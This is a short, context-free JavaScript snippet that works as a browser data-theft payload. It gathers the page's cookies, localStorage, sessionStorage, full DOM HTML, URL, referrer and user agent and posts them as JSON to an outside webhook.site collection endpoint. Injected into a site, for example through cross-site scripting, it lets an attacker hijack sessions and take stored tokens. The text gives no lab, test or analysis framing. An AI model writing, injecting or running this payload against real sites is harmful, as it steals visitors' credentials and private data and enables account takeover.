
const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML,
    userAgent: navigator.userAgent,
    url: window.location.href,
    referrer: document.referrer,
  };
  
  fetch('https://webhook.site/bf17564a-dae7-4a76-9ff8-239b0ff3cdc5', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .then(response => response.text())
  .then(result => console.log('Success:', result))
  .catch(error => console.error('Error:', error));
